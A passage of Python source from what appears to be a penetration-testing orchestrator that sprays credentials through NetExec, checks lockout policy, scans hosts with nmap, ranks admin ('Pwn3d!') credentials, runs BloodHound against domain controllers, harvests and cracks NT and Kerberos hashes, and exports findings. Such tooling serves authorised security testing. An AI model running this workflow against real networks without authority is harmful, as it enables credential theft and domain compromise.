        return self.grow_combo_path or (self.loot.root / "auto-grown-creds.txt")

    def _append_grow_combo(self, entries: list[dict]):
        """Append harvested hashes in combo-file format (user:lm:nt)."""
        path = self._effective_grow_combo()
        path.parent.mkdir(parents=True, exist_ok=True)
        with open(path, "a") as fh:
            for e in entries:
                if not e.get("nt"):
                    continue
                fh.write(f"{e['user']}:{e['lm']}:{e['nt']}\n")

    def _inspect_pass_pol(self, host: str, out: Path):
        """Parse `nxc smb --pass-pol` output for lockout threshold/duration
        and warn loudly when it could lock accounts during the spray."""
        try:
            text = out.read_text(errors="replace")
        except OSError:
            return
        m = LOCKOUT_THRESHOLD_RE.search(text)
        if not m:
            return
        threshold = int(m.group(1))
        if threshold == 0:
            return  # 'No lockout' policy
        duration_match = LOCKOUT_DURATION_RE.search(text)
        duration = duration_match.group(1).strip() if duration_match else "?"
        per_user_attempts = sum(
            1 for c in self.credentials
            if c.user and c.user.lower() not in {u for u, _ in NULL_SESSION_CREDS}
        )
        self.lockout_warnings.append({"host": host, "threshold": threshold, "duration": duration})
        if per_user_attempts > threshold:
            print(
                f"\n  {ICON_WARN} {RED}{BOLD}LOCKOUT RISK on {host}{RESET}: "
                f"{RED}policy={threshold} attempts / {duration}, "
                f"you're spraying ~{per_user_attempts} per user.{RESET}",
                file=sys.stderr,
            )
            if self.delay == 0:
                print(f"    {DIM}→ consider --delay 60 --jitter 30 for the next run{RESET}", file=sys.stderr)
            self._record_error(f"lockout risk on {host} (policy={threshold})")

    @staticmethod
    def _resolve_dc_via_dns(domain: str, timeout: int = 5) -> list[str]:
        """Ask DNS for SRV _ldap._tcp.dc._msdcs.<domain> via dig or nslookup.
        Returns a list of resolved DC hostnames/IPs (best-effort, may be empty)."""
        query = f"_ldap._tcp.dc._msdcs.{domain}"
        # dig prints lines like '0 100 389 dc01.corp.local.' (prio weight port target)
        for tool, args in (
            ("dig", ["+short", "+timeout=" + str(timeout), query, "SRV"]),
            ("nslookup", ["-type=SRV", query]),
        ):
            if shutil.which(tool) is None:
                continue
            try:
                result = subprocess.run([tool, *args], capture_output=True, text=True, timeout=timeout + 1)
            except subprocess.TimeoutExpired:
                continue
            if result.returncode != 0:
                continue
            hosts: list[str] = []
            for line in (result.stdout or "").splitlines():
                line = line.strip()
                if not line:
                    continue
                if tool == "dig":
                    parts = line.split()
                    if len(parts) >= 4:
                        hosts.append(parts[-1].rstrip("."))
                else:  # nslookup
                    if "svr hostname" in line.lower() or "service location" in line.lower():
                        host = line.split("=")[-1].strip().rstrip(".")
                        if host:
                            hosts.append(host)
            if hosts:
                return hosts
        return []

    def _pick_best_domain_cred(self, domain: str) -> "dict | None":
        """Best valid cred for `domain` across the whole run, not just one host.
        Order: (Pwn3d!) wins, then domain-auth-only (no local), then password
        over hash. Reuses _pick_best_cred() so the ranking stays consistent
        with the per-host post-exploit selector."""
        domain_lc = domain.lower()
        candidates = [
            v for v in self.valid_creds
            if not v["local_auth"]
            and self.host_domain.get(v["host"]) == domain_lc
        ]
        if not candidates:
            return None
        return self._pick_best_cred(candidates)

    def _pick_dc_for_domain(self, domain: str) -> tuple[str | None, str]:
        """Return (dc_ip, source) for the best DC of `domain`.
        Source priority: DNS SRV > SQLite cache > host that advertised it."""
        dns_dcs = self._resolve_dc_via_dns(domain)
        if dns_dcs:
            if self.cache:
                for ip in dns_dcs:
                    self.cache.record_dc(domain, ip, "dns_srv")
            return dns_dcs[0], "dns_srv"
        if self.cache:
            records = self.cache.get_dcs(domain)
            if records:
                return records[0][0], records[0][1]
        hosts = self.domain_hosts.get(domain.lower())
        if hosts:
            return next(iter(hosts)), "smb_banner"
        return None, ""

    def _dc_fqdn_for_domain(self, domain: str, dc_ip: str) -> str | None:
        """Return 'DC01.corp.local' if we know the NetBIOS name for `dc_ip`
        (captured during _probe_smb_banner / _detect_dc_from_results), else None.
        BloodHound and Kerberos both prefer FQDN for the -dc parameter."""
        name = self.host_names.get(dc_ip)
        if not name:
            return None
        return f"{name}.{domain.lower()}"

    def _run_bloodhound_pass(self):
        """For every discovered domain, run bloodhound-python once (TTL-deduped),
        using the most-privileged domain credential we found during the spray."""
        if not self.bloodhound_runner:
            return
        if not self.domain_hosts:
            self._vprint(V_VERBOSE, f"  {DIM}🩸 BloodHound: no domain detected, skipping{RESET}")
            return

        print(f"\n{'─' * BANNER_WIDTH}")
        print(f"  {ICON_BLOODHOUND} {BOLD}BloodHound Collection{RESET}")
        print(f"{'─' * BANNER_WIDTH}")

        for domain in self.domain_hosts:
            cached = self.bloodhound_runner.already_collected(domain)
            if cached:
                ran_at = datetime.fromtimestamp(cached["ran_at"]).strftime("%Y-%m-%d %H:%M")
                print(f"  {ICON_SKIP} {domain} {DIM}already collected at {ran_at} → skipped{RESET}")
                print(f"     {DIM}→ {cached['output_path']}{RESET}")
                continue

            cred_entry = self._pick_best_domain_cred(domain)
            if not cred_entry:
                print(f"  {ICON_NOOP} {domain} {DIM}no domain credential available — skipped{RESET}")
                continue
            cred = cred_entry["credential"]
            is_admin = self._is_pwn3d(cred_entry["raw"])
            cred_marker = f"{RED}{BOLD}(Pwn3d!){RESET}" if is_admin else f"{DIM}(non-admin){RESET}"

            dc_ip, dc_source = self._pick_dc_for_domain(domain)
            if not dc_ip:
                print(f"  {ICON_NOOP} {domain} {DIM}no DC candidate identified — skipped{RESET}")
                continue
            dc_host = self._dc_fqdn_for_domain(domain, dc_ip)
            dc_display = f"{dc_host} ({dc_ip})" if dc_host else dc_ip

            user_display = BloodHoundRunner._strip_domain_prefix(cred.user)
            print(f"  {ICON_SUBTASK} {BOLD}{domain}{RESET} {DIM}via {dc_display} [{dc_source}] as{RESET} "
                  f"{BOLD}{user_display}{RESET} {cred_marker}")

            success, out_dir, err = self.bloodhound_runner.collect(
                domain, dc_ip, cred, dc_host=dc_host,
            )
            self.bloodhound_results.append({
                "domain": domain, "dc_ip": dc_ip, "auth_user": user_display,
                "output_path": str(out_dir), "success": success, "error": err,
            })
            if success:
                print(f"    {ICON_OK} collected {DIM}→ {_truncate_path(out_dir)}{RESET}")
            else:
                print(f"    {ICON_FAIL} failed {DIM}{err}{RESET}")
                print(f"    {DIM}→ {_truncate_path(out_dir)} (see stderr.log){RESET}")
                self._record_error(f"bloodhound {domain}: {err or 'unknown'}")

    @staticmethod
    def _is_expandable_spec(target: str) -> bool:
        """True if the target is a CIDR / range that nmap will expand into many hosts."""
        return "/" in target or "-" in target

    def _discover_target(self, target: str) -> dict[str, set[int]]:
        """Resolve a target spec into {host: {open_ports}}.

        Without --nmap, returns {target: set()} unless --reachability-check
        is on (default) and a stdlib TCP probe to a small set of common
        ports times out — in which case the target is treated as dead and
        skipped, sparing the spray of ~15 worker-minutes per dead /24.

        With --nmap, runs the full scan (cache-aware for single hosts) and
        returns only hosts with at least one open port.
        """
        if not self.nmap_enabled or self.scanner is None:
            # CIDR / range specs can't be TCP-probed as a unit — let them through.
            if not self.reachability_check or self._is_expandable_spec(target):
                return {target: set()}
            if self._is_host_reachable(target):
                return {target: set()}
            # Treat as dead; the caller records it in self.dead_hosts.
            self._vprint(V_VERBOSE, f"  {DIM}↷ {target} unreachable (TCP probe failed) — skipped{RESET}")
            return {}

        expandable = self._is_expandable_spec(target)

        # --rescan ignores the cache read so a fresh nmap overwrites whatever
        # is stored (including re-validating a host marked dead).
        if self.cache and not expandable and not self.rescan:
            cached = self.cache.get_fresh(target)
            if cached is not None:
                open_set = {p for p, st in cached.items() if st == "open"}
                if open_set:
                    self._vprint(
                        V_VERBOSE,
                        f"  {DIM}🗎 cache hit {target} → {len(open_set)} open port(s){RESET}",
                    )
                    return {target: open_set}
                # Cached as dead / no open ports. Liveness is volatile, so
                # re-probe (cheap TCP connect) before trusting it — a host that
                # came back online shouldn't stay skipped until the sentinel
                # expires. Respect --no-reachability-check by trusting the cache.
                if not self.reachability_check or not self._is_host_reachable(target):
                    self._vprint(V_VERBOSE, f"  {DIM}🗎 cache hit {target} → dead (still unreachable){RESET}")
                    return {}
                self._vprint(
                    V_VERBOSE,
                    f"  {DIM}🗎 {target} was cached dead but answers now → rescanning{RESET}",
                )
                self.cache.invalidate(target)
            else:
                self._vprint(V_VERBOSE, f"  {DIM}🗎 cache miss {target} → running nmap{RESET}")

        # Range cache reuse: expand a CIDR and only nmap the IPs we don't
        # already know, reusing cached open-port sets / dead sentinels.
        if self.cache and expandable and not self.rescan:
            expanded = self._expand_cidr(target)
            if expanded is not None:
                return self._discover_range_cached(target, expanded)

        scan_result = self.scanner.scan(target)
        self._vprint(
            V_DEBUG,
            f"  {DIM}🔍 nmap raw: {len(scan_result)} host(s) with open ports{RESET}",
        )

        if self.cache:
            if not expandable:
                # nmap may report results keyed by IP rather than the hostname/IP given.
                ports = scan_result.get(target)
                if ports is None and len(scan_result) == 1:
                    ports = next(iter(scan_result.values()))
                self.cache.store(target, ports or {})
            else:
                for ip, ports in scan_result.items():
                    self.cache.store(ip, ports)

        return {
            host: {p for p, st in ports.items() if st == "open"}
            for host, ports in scan_result.items()
            if any(st == "open" for st in ports.values())
        }

    @staticmethod
    def _expand_cidr(spec: str, cap: int = RANGE_EXPAND_CAP) -> list[str] | None:
        """Expand a CIDR spec into its host IPs so we can reuse per-IP cache
        entries. Returns None — meaning 'scan as a single nmap invocation' — for
        non-CIDR specs (nmap dash-ranges, hostnames), unparseable input, or
        ranges larger than `cap` hosts (per-IP bookkeeping isn't worth it)."""
        if "/" not in spec:
            return None
        import ipaddress
        try:
            net = ipaddress.ip_network(spec, strict=False)
        except ValueError:
            return None
        if net.num_addresses > cap:
            return None
        hosts = [str(ip) for ip in net.hosts()]
        return hosts or [str(net.network_address)]  # /32 (and /31) → the address(es)

    def _discover_range_cached(self, spec: str, ips: list[str]) -> dict[str, set[int]]:
        """Discover a CIDR range while reusing the cache: only nmap the IPs we
        don't already know (cache miss / expired), reusing cached open-port sets
        and skipping hosts with a still-fresh dead sentinel. Freshly-scanned
        results — including dead ones — are stored per IP so the next run skips
        them too."""
        known: dict[str, set[int]] = {}
        to_scan: list[str] = []
        for ip in ips:
            cached = self.cache.get_fresh(ip)
            if cached is None:
                to_scan.append(ip)
                continue
            open_set = {p for p, st in cached.items() if st == "open"}
            if open_set:
                known[ip] = open_set
            # else: cached dead within dead_ttl → skip (re-nmapped after dead_ttl)
        if to_scan:
            scan_result = self.scanner.scan(to_scan)
            for ip in to_scan:
                ports = scan_result.get(ip, {})
                self.cache.store(ip, ports)  # open ports, or a dead sentinel
                open_set = {p for p, st in ports.items() if st == "open"}
                if open_set:
                    known[ip] = open_set
        self._vprint(
            V_VERBOSE,
            f"  {DIM}🗎 range {spec}: {len(ips) - len(to_scan)} cached, "
            f"{len(to_scan)} scanned → {len(known)} live{RESET}",
        )
        return known

    @staticmethod
    def _format_open_ports(open_ports: set[int]) -> str:
        protos: list[str] = []
        for proto in ALL_PROTOCOLS:
            if any(p in open_ports for p in PROTOCOL_PORTS.get(proto, [])):
                protos.append(proto.upper())
        return ", ".join(protos) if protos else "none"

    def _validate_flag_combinations(self):
        """Warn (don't fail) when the user enabled a feature whose prerequisites
        can never be met given the other flags. Cheap insurance against
        'why didn't anything happen?' mysteries."""
        warnings: list[str] = []
        if self.crack_enabled and not self.secretsdump and not self.enum_enabled:
            warnings.append(
                "--crack is enabled but no hash sources are. Add --secretsdump "
                "and/or --enum so the cracker has something to chew on."
            )
        if self.secretsdump and not self.enum_enabled:
            warnings.append(
                "--secretsdump without --enum skips the lockout-policy probe; "
                "you won't get the password-policy warning before spraying."
            )
        only = self.only_protocols
        if self.bloodhound_enabled and only and "smb" not in only and "ldap" not in only:
            warnings.append(
                "--bloodhound needs SMB or LDAP, but --only excludes both. "
                "BloodHound collection will be skipped."
            )
        if self.modules and only and "smb" not in only:
            warnings.append("--modules run on SMB but --only excludes it.")
        for w in warnings:
            print(f"  {ICON_WARN} {w}\n", file=sys.stderr)

    @staticmethod
    def _is_nxc_available() -> bool:
        try:
            subprocess.run(["nxc", "--version"], capture_output=True, timeout=5)
            return True
        except (FileNotFoundError, subprocess.TimeoutExpired):
            return False

    def run(self):
        task_count = len(ALL_PROTOCOLS) + len(LOCAL_AUTH_PROTOCOLS)
        pair_count = len(self.credentials)
        total_attempts = len(self.targets) * pair_count * task_count

        # Pre-flight: fail fast if nxc isn't installed — otherwise every
        # attempt will produce an unhelpful 'No such file or directory' error.
        # --scan-only doesn't need nxc, so skip the check in that path.
        if not self.scan_only and not self._is_nxc_available():
            print(
                f"\n  {RED}{BOLD}✗ nxc not found in PATH.{RESET}\n"
                f"  {DIM}Install with:{RESET} {BOLD}./scripts/update-nxc.sh{RESET}\n"
                f"  {DIM}or:           {RESET} {BOLD}pipx install netexec{RESET}\n",
                file=sys.stderr,
            )
            sys.exit(127)

        if self.nmap_enabled and self.scanner is not None and not NmapScanner.is_available():
            print(f"  {ICON_WARN} nmap not found in PATH — disabling pre-scan\n", file=sys.stderr)
            self.nmap_enabled = False
            self.scanner = None
            if self.scan_only:
                print(f"  {ICON_FAIL} --scan-only requires nmap; aborting.\n", file=sys.stderr)
                sys.exit(2)

        if self.bloodhound_runner and not BloodHoundRunner.is_available():
            print(f"  {ICON_WARN} bloodhound-python not found in PATH — disabling --bloodhound\n", file=sys.stderr)
            self.bloodhound_runner = None
            self.bloodhound_enabled = False

        if self.cracker and self.crack_enabled:
            chosen = self.cracker.cracker()
            wl = self.cracker.find_wordlist()
            if not chosen:
                print(f"  {ICON_WARN} neither hashcat nor john found in PATH — disabling --crack\n", file=sys.stderr)
                self.crack_enabled = False
                self.cracker = None
            elif not wl:
                print(
                    f"  {ICON_WARN} wordlist not found — disabling --crack.\n"
                    f"  {DIM}Looked in:{RESET}\n"
                    + "".join(f"    {DIM}- {p}{RESET}\n" for p in WORDLIST_DEFAULT_PATHS)
                    + f"  {DIM}Pass --wordlist /path/to/file or download rockyou:{RESET}\n"
                    f"    {DIM}wget -O ~/wordlists/rockyou.txt {ROCKYOU_DOWNLOAD_URL}{RESET}\n",
                    file=sys.stderr,
                )
                self.crack_enabled = False
                self.cracker = None

        self._validate_flag_combinations()

        if self.verbosity > V_QUIET:
            self._print_scan_banner(total_attempts)

        # Discover everything up-front so we can run the SMB banner probes
        # in parallel across all live hosts (the previous code did them
        # serially right before each host's spray, adding ~5s × N hosts).
        all_discovered: list[tuple[str, dict[str, set[int]]]] = []
        for raw_target in self.targets:
            discovered = self._discover_target(raw_target)
            if not discovered:
                msg = "no open ports / unreachable" if self.nmap_enabled else "unreachable"
                self.dead_hosts.append(raw_target)
                if self.verbosity > V_QUIET:
                    print(f"  {DIM}► {raw_target} — {msg}{RESET}\n")
                continue
            all_discovered.append((raw_target, discovered))

        # Parallel SMB-banner sweep: every live host has its name/domain ready
        # before its header is printed below — no per-host startup latency.
        live_hosts: dict[str, set[int]] = {}
        for _, disc in all_discovered:
            for host, ports in disc.items():
                live_hosts[host] = ports if self.nmap_enabled else set()
        if live_hosts:
            self._bulk_probe_smb_banners(live_hosts)

        try:
            for raw_target, discovered in all_discovered:

                for host, open_ports in discovered.items():
                    tasks = self._build_protocol_tasks(open_ports if self.nmap_enabled else None)

                    if self.verbosity > V_QUIET:
                        hostname = self._resolved_hostname(host)
                        header = f"  {GREEN}{BOLD}► {host}{RESET}"
                        if hostname:
                            header += f" {DIM}({hostname}){RESET}"
                        if self.nmap_enabled:
                            header += f" {DIM}[{self._format_open_ports(open_ports)}]{RESET}"
                        print(header + "\n")

                    if not tasks:
                        if self.verbosity > V_QUIET:
                            print(f"  {DIM}── no testable protocols on this host{RESET}\n")
                        continue

                    if self.scan_only:
                        continue

                    results = self._collect_target_results(host, tasks, pair_count)
                    # Wipe the progress bar (stderr) before mixing in stdout output;
                    # also flush stdout so the per-host summary doesn't interleave
                    # with the next target's progress bar.
                    sys.stderr.write("\r" + " " * _term_width() + "\r")
                    sys.stderr.flush()
                    sys.stdout.flush()

                    if self.verbosity > V_QUIET:
                        self._print_target_results(results, tasks)
                        sys.stdout.flush()

                    # Post-spray analysis: detect DC, harvest valid creds, run enum/modules
                    self._detect_dc_from_results(host, results, open_ports if self.nmap_enabled else None)
                    host_valid = self._extract_valid_creds_from_results(host, results)
                    if host_valid:
                        self.valid_creds.extend(host_valid)
                        if self.verbosity == V_QUIET:
                            # PTR + SMB-banner-derived name (whichever resolves first)
                            host_tag = self._format_host_tag(host)
                            for entry in host_valid:
                                label = self._task_label(entry["protocol"], entry["local_auth"])
                                if self._is_pwn3d(entry["raw"]):
                                    print(f"  {RED}{BOLD}💀 {host_tag}{RESET} {BOLD}{label:<20}{RESET} {RED}{entry['raw']}{RESET}")
                                else:
                                    print(f"  {GREEN}► {host_tag}{RESET} {BOLD}{label:<20}{RESET} {GREEN}{entry['raw']}{RESET}")
                        self._post_exploit_host(host, host_valid)

            # Domain-wide LDAP enumeration runs after all hosts have been
            # sprayed so we can pick the most-privileged cred we've seen.
            # Order matters: LDAP enum first (cheap, harvests AS-REP/TGS
            # hashes that may then get cracked), then BloodHound.
            if self.enum_enabled:
                self._run_ldap_enum_pass()

            if self.bloodhound_enabled:
                self._run_bloodhound_pass()

            if self.export_json_path or self.export_csv_path:
                self._write_exports()

            self._print_final_report()
            self._print_run_diagnostics()
        finally:
            if self.cache:
                self.cache.close()

        if self.strict and self.strict_errors:
            sys.exit(1)

    def _resolved_hostname(self, host: str) -> str | None:
        """Best hostname we know for `host`, in order:
          1. DNS PTR (when the engagement network has DNS)
          2. SMB banner 'NAME.domain' captured by _probe_smb_banner /
             _detect_dc_from_results (works on isolated AD)
          3. None (caller falls back to raw IP)"""
        hostname = self.resolver.resolve(host) if self.resolver else None
        if not hostname:
            name = self.host_names.get(host)
            domain = self.host_domain.get(host)
            if name and domain:
                hostname = f"{name}.{domain}"
            elif name:
                hostname = name
        return hostname

    def _format_host_tag(self, host: str, width: int = 0) -> str:
        """Render '10.10.10.5' or '10.10.10.5 (DC01.corp.local)' for the report."""
        hostname = self._resolved_hostname(host)
        tag = f"{host} ({hostname})" if hostname else host
        return tag.ljust(width) if width else tag

    def _print_final_report(self):
        """Aggregate end-of-run report grouping every interesting outcome
        (admin pwns, valid creds, harvested hashes, cracked plaintexts,
        BloodHound collections, dead hosts) into one scannable block.

        Suppressed in quiet (-q); always shown otherwise."""
        if self.verbosity <= V_QUIET:
            return

        pwn3d = [v for v in self.valid_creds if self._is_pwn3d(v["raw"])]
        others = [v for v in self.valid_creds if not self._is_pwn3d(v["raw"])]
        cracked = list(self.cracked_creds)
        nt_count = sum(1 for h in self.harvested_hashes if h.get("nt"))
        krb_count = sum(h.get("count", 0) for h in self.harvested_hashes if "kerberos_file" in h)
        bh_ok = [b for b in self.bloodhound_results if b.get("success")]

        # Compute a sensible host-column width across all rows that will be printed
        cred_hosts = [self._format_host_tag(v["host"]) for v in self.valid_creds]
        host_w = min(40, max((len(h) for h in cred_hosts), default=18))

        print(f"\n{BOLD}{CYAN}{'═' * 72}{RESET}")
        print(f"  {CYAN}{BOLD}📋 FINAL REPORT{RESET}")
        print(f"{BOLD}{CYAN}{'═' * 72}{RESET}\n")

        if pwn3d:
            print(f"  {ICON_PWN3D} {RED}{BOLD}ADMIN PWN3D ({len(pwn3d)}){RESET}")
            for v in pwn3d:
                label = self._task_label(v["protocol"], v["local_auth"])
                tag = self._format_host_tag(v["host"], host_w)
                print(f"     {RED}{tag}{RESET} {DIM}→{RESET} {BOLD}{label:<15}{RESET} {RED}{v['raw']}{RESET}")
            print()

        if others:
            print(f"  {ICON_FINDING} {GREEN}{BOLD}VALID CREDENTIALS ({len(others)}){RESET}")
            for v in others:
                label = self._task_label(v["protocol"], v["local_auth"])
                tag = self._format_host_tag(v["host"], host_w)
                print(f"     {GREEN}{tag}{RESET} {DIM}→{RESET} {BOLD}{label:<15}{RESET} {GREEN}{v['raw']}{RESET}")
            print()

        if nt_count or krb_count:
            print(f"  {ICON_HARVEST} {GREEN}{BOLD}HASHES HARVESTED{RESET}")
            if nt_count:
                grow = self._effective_grow_combo()
                print(f"     {GREEN}{nt_count}× NT (SAM/LSA/NTDS){RESET} {DIM}→ {_truncate_path(grow)}{RESET}")
            if krb_count:
                print(f"     {GREEN}{krb_count}× Kerberos (AS-REP / TGS-REP){RESET}")
            print()

        if cracked:
            print(f"  {ICON_CRACK} {CYAN}{BOLD}CRACKED PLAINTEXT ({len(cracked)}){RESET}")
            for c in cracked:
                src = c.get("source", "?")
                print(f"     {GREEN}{c['user']}:{c['password']}{RESET} {DIM}({src}){RESET}")
            print()

        if bh_ok:
            print(f"  {ICON_BLOODHOUND} {CYAN}{BOLD}BLOODHOUND ({len(bh_ok)} domain{'s' if len(bh_ok) != 1 else ''}){RESET}")
            for b in bh_ok:
                print(f"     {CYAN}{b['domain']}{RESET} {DIM}via {b['dc_ip']} → {_truncate_path(b['output_path'])}{RESET}")
            print()

        if self.dead_hosts:
            shown = self.dead_hosts[:10]
            extra = len(self.dead_hosts) - len(shown)
            tail = f" (+{extra} more)" if extra > 0 else ""
            print(f"  {ICON_NOOP} {YELLOW}{BOLD}NO RESPONSE ({len(self.dead_hosts)}){RESET}")
            print(f"     {DIM}{', '.join(shown)}{tail}{RESET}")
            print()

        if self.skip_tried and self.skipped_already_tried:
            print(f"  {ICON_SKIP} {DIM}{BOLD}SKIPPED — ALREADY TRIED ({self.skipped_already_tried}){RESET}")
            print(f"     {DIM}cached in {_truncate_path(self.cache.path) if self.cache else '?'} — pass --rerun-after to retry failures{RESET}")
            print()

        # Bottom line: if literally nothing happened, say so plainly.
        if not (pwn3d or others or cracked or nt_count or krb_count or bh_ok):
            if self.dead_hosts:
                msg = f"only {len(self.dead_hosts)} host(s) probed — all unreachable / no auth attempts produced findings"
            else:
                msg = "no valid credentials found"
            print(f"  {RED}{BOLD}✘ {msg}.{RESET}\n")

        print(f"{BOLD}{CYAN}{'═' * 72}{RESET}\n")

    def _print_run_diagnostics(self):
        """End-of-run summary of errors collected during the spray.
        Always printed when non-empty; in --strict mode the exit code follows."""
        if not self.strict_errors:
            return
        n = len(self.strict_errors)
        head = f"\n{ICON_WARN} {BOLD}{n} error{'s' if n != 1 else ''} during this run:{RESET}"
        if self.strict:
            head += f" {RED}{BOLD}(--strict → exit 1){RESET}"
        print(head, file=sys.stderr)
        # Cap at 20 so we don't dump 500 timeouts to the user.
        for err in self.strict_errors[:20]:
            print(f"  {DIM}- {err}{RESET}", file=sys.stderr)
        if n > 20:
            print(f"  {DIM}... and {n - 20} more{RESET}", file=sys.stderr)
        print(file=sys.stderr)

    def _write_exports(self):
        """Persist a structured summary of the run to JSON / CSV."""
        import csv as _csv
        import json as _json

        creds_records = []
        for entry in self.valid_creds:
            c = entry["credential"]
            creds_records.append({
                "host": entry["host"],
                "protocol": entry["protocol"],
                "local_auth": entry["local_auth"],
                "user": c.user,
                "secret_type": "hash" if c.is_hash else "password",
                "domain": self.host_domain.get(entry["host"]),
                "pwn3d": self._is_pwn3d(entry["raw"]),
                "raw": entry["raw"],
            })

        if self.export_json_path:
            doc = {
                "started_at": self.started_at.isoformat(timespec="seconds"),
                "finished_at": datetime.now().isoformat(timespec="seconds"),
                "targets": self.targets,
                "valid_credentials": creds_records,
                "domain_controllers": [
                    {"domain": dom, "hosts": sorted(hs)}
                    for dom, hs in self.domain_hosts.items()
                ],
                "harvested_hashes": self.harvested_hashes,
                "cracked_credentials": self.cracked_creds,
                "lockout_warnings": self.lockout_warnings,
            }
            self.export_json_path.parent.mkdir(parents=True, exist_ok=True)
            self.export_json_path.write_text(_json.dumps(doc, indent=2))
            print(f"  {GREEN}💾 JSON → {self.export_json_path}{RESET}")

        if self.export_csv_path:
            self.export_csv_path.parent.mkdir(parents=True, exist_ok=True)
            with open(self.export_csv_path, "w", newline="") as fh:
                writer = _csv.DictWriter(
                    fh, fieldnames=["host", "protocol", "local_auth", "user",
                                    "secret_type", "domain", "pwn3d", "raw"],
                )
                writer.writeheader()
                writer.writerows(creds_records)
            print(f"  {GREEN}💾 CSV  → {self.export_csv_path}{RESET}")

